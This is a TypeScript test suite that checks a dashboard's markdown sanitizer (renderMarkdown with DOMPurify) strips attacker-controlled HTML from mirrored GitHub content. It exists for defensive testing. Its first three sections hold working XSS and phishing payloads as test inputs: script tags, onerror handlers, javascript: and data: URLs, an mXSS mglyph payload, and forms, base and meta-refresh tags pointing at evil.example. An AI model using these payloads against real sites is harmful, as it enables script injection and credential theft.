// Sanitizer tests for the real exported renderMarkdown.
//
// Task descriptions and comment bodies are mirrored verbatim from third-party
// sources (GitHub issue and comment bodies), so renderMarkdown is the security
// boundary between attacker-controlled markdown and the dashboard DOM. These
// tests pin that boundary: the payloads below must stay neutralised across any
// future change to the sanitizer configuration.
import { JSDOM } from 'jsdom';

// DOMPurify binds to `globalThis.window` when its module is first evaluated, so
// a DOM has to exist before markdown.js (and its dompurify import) is loaded.
const dom = new JSDOM('');
const globals = globalThis as unknown as { window?: unknown; document?: unknown };
globals.window = dom.window;
globals.document = dom.window.document;

const { renderMarkdown } = await import('./markdown.js');

const failures: string[] = [];
let checks = 0;

function check(name: string, fn: () => void): void {
  checks += 1;
  try {
    fn();
  } catch (err) {
    failures.push(`${name}: ${(err as Error).message}`);
  }
}

function parse(html: string): HTMLElement {
  const host = dom.window.document.createElement('div');
  host.innerHTML = html;
  return host as unknown as HTMLElement;
}

function assertNoElement(html: string, selector: string, message: string): void {
  if (parse(html).querySelector(selector) !== null) {
    throw new Error(`${message}: found <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertElement(html: string, selector: string, message: string): void {
  if (parse(html).querySelector(selector) === null) {
    throw new Error(`${message}: no <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertNotContains(html: string, needle: string, message: string): void {
  if (html.toLowerCase().includes(needle.toLowerCase())) {
    throw new Error(`${message}: found ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertContains(html: string, needle: string, message: string): void {
  if (!html.includes(needle)) {
    throw new Error(`${message}: missing ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertEqual(actual: string, expected: string, message: string): void {
  if (actual !== expected) {
    throw new Error(`${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

/** Fails if any element in the output carries an inline event handler. */
function assertNoEventHandlers(html: string, message: string): void {
  for (const el of parse(html).querySelectorAll('*')) {
    for (const attr of el.attributes) {
      if (attr.name.toLowerCase().startsWith('on')) {
        throw new Error(`${message}: ${el.tagName} has ${attr.name} in ${JSON.stringify(html)}`);
      }
    }
  }
}

// ---------------------------------------------------------------------------
// 1. Phishing surface — issue #195. Form controls must not survive.
// ---------------------------------------------------------------------------

function formControls(): void {
  const phishing = renderMarkdown(
    '<form action="https://evil.example"><input name=token type=password>' +
      '<button>Sign in</button></form>',
  );

  check('form tag stripped', () => {
    assertNoElement(phishing, 'form', 'credential-phishing form survived');
  });
  check('form action attribute stripped', () => {
    assertNotContains(phishing, 'evil.example', 'attacker origin survived');
    assertNotContains(phishing, 'action', 'action attribute survived');
  });
  check('password input stripped', () => {
    assertNoElement(phishing, 'input', 'password field survived');
    assertNotContains(phishing, '<input', 'input tag survived');
  });
  check('submit button stripped', () => {
    assertNoElement(phishing, 'button', 'submit button survived');
  });

  check('select and option stripped', () => {
    const out = renderMarkdown('<select><option>a</option></select>');
    assertNoElement(out, 'select', 'select survived');
    assertNotContains(out, '<option', 'option survived');
  });
  check('textarea stripped', () => {
    const out = renderMarkdown('<textarea>x</textarea>');
    assertNoElement(out, 'textarea', 'textarea survived');
  });
  check('formaction stripped', () => {
    const out = renderMarkdown('<button formaction="https://evil.example">go</button>');
    assertNotContains(out, 'formaction', 'formaction survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });
}

// ---------------------------------------------------------------------------
// 2. Spoofing surface — audit findings LOW-1 (style) and LOW-2 (download).
// ---------------------------------------------------------------------------

function spoofingAttributes(): void {
  check('style attribute stripped', () => {
    const out = renderMarkdown(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>',
    );
    assertNotContains(out, 'style=', 'inline style survived');
    assertNotContains(out, 'position:fixed', 'overlay styling survived');
    assertContains(out, 'overlay', 'element content should be preserved');
  });

  check('download attribute stripped', () => {
    const out = renderMarkdown('<a href="https://x.example/f" download="invoice.pdf">dl</a>');
    assertNotContains(out, 'download', 'download attribute survived');
    assertContains(out, 'https://x.example/f', 'safe href should be preserved');
  });
}

// ---------------------------------------------------------------------------
// 3. Script execution regressions. These already hold; pinned so that a future
//    configuration change cannot silently reopen script execution.
// ---------------------------------------------------------------------------

function scriptExecution(): void {
  check('script tag stripped', () => {
    const out = renderMarkdown('<script>alert(1)</script>');
    assertNoElement(out, 'script', 'script survived');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('inline event handler stripped', () => {
    const out = renderMarkdown('<img src=x onerror=alert(1)>');
    assertNoEventHandlers(out, 'event handler survived');
    assertNotContains(out, 'onerror', 'onerror survived');
  });

  check('javascript: href stripped', () => {
    const out = renderMarkdown('[click](javascript:alert(1))');
    assertNotContains(out, 'javascript:', 'javascript: URL survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('data: html href stripped', () => {
    const out = renderMarkdown('[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    assertNotContains(out, 'data:text/html', 'data: HTML URL survived');
  });

  check('iframe srcdoc stripped', () => {
    const out = renderMarkdown('<iframe srcdoc="<script>alert(1)</script>"></iframe>');
    assertNoElement(out, 'iframe', 'iframe survived');
    assertNotContains(out, 'srcdoc', 'srcdoc survived');
  });

  check('mXSS mglyph payload neutralised', () => {
    const out = renderMarkdown(
      '<math><mtext><table><mglyph><style><!--</style><img title="-->' +
        '<img src=1 onerror=alert(1)>">',
    );
    assertNoElement(out, 'img', 'mXSS img survived');
    assertNoEventHandlers(out, 'mXSS handler survived');
    assertNotContains(out, 'alert(1)', 'mXSS payload survived');
  });

  check('base tag stripped', () => {
    const out = renderMarkdown('<base href="https://evil.example/">');
    assertNoElement(out, 'base', 'base survived');
    assertNotContains(out, 'evil.example', 'base href survived');
  });

  check('meta refresh stripped', () => {
    const out = renderMarkdown('<meta http-equiv="refresh" content="0;url=https://evil.example">');
    assertNoElement(out, 'meta', 'meta survived');
    assertNotContains(out, 'evil.example', 'redirect target survived');
  });

  check('object and embed stripped', () => {
    const out = renderMarkdown(
      '<object data="https://evil.example/x"></object><embed src="https://evil.example/y">',
    );
    assertNoElement(out, 'object', 'object survived');
    assertNoElement(out, 'embed', 'embed survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('style element stripped', () => {
    const out = renderMarkdown('<style>body{display:none}</style>');
    assertNoElement(out, 'style', 'style element survived');
    assertNotContains(out, 'display:none', 'style rules survived');
  });

  check('target attribute stripped (no tabnabbing)', () => {
    const out = renderMarkdown('<a href="https://x.example" target="_blank">x</a>');
    assertNotContains(out, 'target', 'target survived');
  });
}

// ---------------------------------------------------------------------------
// 4. Positive cases. A sanitizer that breaks ordinary rendering is its own
//    outage, so pin the shapes real task descriptions rely on.
// ---------------------------------------------------------------------------

function ordinaryMarkdown(): void {
  check('headings render', () => {
    assertEqual(renderMarkdown('# Title'), '<h1>Title</h1>\n', 'heading changed');
  });

  check('emphasis renders', () => {
    assertEqual(
      renderMarkdown('**bold** and _em_'),
      '<p><strong>bold</strong> and <em>em</em></p>\n',
      'emphasis changed',
    );
  });

  check('safe links render with href intact', () => {
    const out = renderMarkdown('[docs](https://example.com/docs)');
    assertElement(out, 'a[href="https://example.com/docs"]', 'safe link lost its href');
    assertContains(out, 'docs</a>', 'link text lost');
  });

  check('relative links render', () => {
    assertElement(renderMarkdown('[t](/tasks/1)'), 'a[href="/tasks/1"]', 'relative link lost');
  });

  check('code blocks render', () => {
    assertEqual(
      renderMarkdown('```js\nconst a = 1;\n```'),
      '<pre><code class="language-js">const a = 1;\n</code></pre>\n',
      'code block changed',
    );
  });

  check('inline code escapes html', () => {
    const out = renderMarkdown('use `<form>` here');
    assertContains(out, '<code>&lt;form&gt;</code>', 'inline code lost its escaped content');
    assertNoElement(out, 'form', 'inline code produced a real form');
  });

  check('lists render', () => {
    assertEqual(
      renderMarkdown('- one\n- two\n'),
      '<ul>\n<li>one</li>\n<li>two</li>\n</ul>\n',
      'list changed',
    );
  });

  check('tables render', () => {
    const out = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |\n');
    assertElement(out, 'table', 'table lost');
    assertContains(out, '<th>a</th>', 'table header lost');
  });

  check('images with safe src render', () => {
    assertElement(
      renderMarkdown('![alt](https://example.com/i.png)'),
      'img[src="https://example.com/i.png"]',
      'safe image lost',
    );
  });

  check('empty input renders empty', () => {
    assertEqual(renderMarkdown(''), '', 'empty markdown should render empty');
  });
}

// ---------------------------------------------------------------------------
// 5. Task lists. FORBID_TAGS strips marked's <input type=checkbox>, so
//    renderMarkdown substitutes an inert glyph. Pin that the checked and
//    unchecked states stay distinguishable and that no input comes back.
// ---------------------------------------------------------------------------

function taskLists(): void {
  check('task list state survives without an input element', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☐', 'unchecked state lost');
    assertContains(out, '☑', 'checked state lost');
    assertContains(out, 'todo', 'unchecked item text lost');
    assertContains(out, 'done', 'checked item text lost');
  });

  check('nested task lists keep their state', () => {
    const out = renderMarkdown('- [x] outer\n  - [ ] inner\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☑</span> outer', 'outer state lost');
    assertContains(out, '☐</span> inner', 'inner state lost');
  });
}

function run(): void {
  formControls();
  spoofingAttributes();
  scriptExecution();
  ordinaryMarkdown();
  taskLists();

  if (failures.length > 0) {
    throw new Error(
      `${failures.length} of ${checks} markdown sanitizer checks failed:\n` +
        failures.map((f) => `  - ${f}`).join('\n'),
    );
  }
  console.log(`markdown sanitizer: ${checks} checks passed`);
}

run();
